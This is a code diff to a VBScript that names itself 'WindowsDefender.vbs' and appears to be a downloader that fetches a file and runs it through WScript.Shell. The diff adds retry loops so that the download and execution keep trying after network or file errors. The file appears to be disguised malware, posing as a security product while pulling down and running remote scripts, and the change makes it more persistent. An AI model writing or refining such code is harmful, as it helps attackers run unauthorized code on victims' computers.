@@ -38,7 +38,7 @@ sub CheckInternetConnection()
 		RunScript
     Else
 		'WScript.Echo "Internet is not connected! (from WindowsDefender.vbs)"
-		WScript.Sleep 3000
+		WScript.Sleep 10000 ' 10 seconds
 		CheckInternetConnection
     End If
 End sub
@@ -76,6 +76,8 @@ sub DownloadFile()
     ' Handle errors during the file save
     If Err.Number <> 0 Then
         'WScript.Echo "Error saving the file: " & Err.Description & "(from WindowsDefender.vbs)"
+        WScript.Sleep 10000 ' 10 seconds
+        DownloadFile
 		Exit Sub
     Else
         'WScript.Echo "Downloaded " & downloadedFilename & " successfully. (from WindowsDefender.vbs)"
@@ -93,5 +95,7 @@ sub RunScript()
         CreateObject("WScript.Shell").Run "wscript """ & scriptPath & """", 1, True
     Else
         'WScript.Echo "Error: Script file not found at path: " & scriptPath & "(from WindowsDefender.vbs)"
+        WScript.Sleep 10000 ' 10 seconds
+        Start
     End If
 End sub
